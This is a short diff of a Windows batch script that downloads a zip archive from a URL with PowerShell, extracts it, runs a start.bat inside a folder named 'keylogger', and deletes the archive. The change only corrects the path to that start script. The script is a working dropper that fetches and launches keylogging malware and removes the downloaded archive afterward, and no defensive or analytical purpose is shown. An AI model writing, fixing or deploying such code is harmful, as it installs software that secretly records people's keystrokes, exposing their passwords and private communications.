@@ -9,7 +9,7 @@ if not exist "%EXTRACT_DIR%" mkdir "%EXTRACT_DIR%"
 powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%' | Out-Null"
 powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%EXTRACT_DIR%' -Force"
 pushd "%EXTRACT_DIR%"
-call "%EXTRACT_DIR%\keylogger\keylogger\start.bat"
+call "%EXTRACT_DIR%\keylogger\start.bat"
 :done
 popd
 del "%ZIP_FILE%"
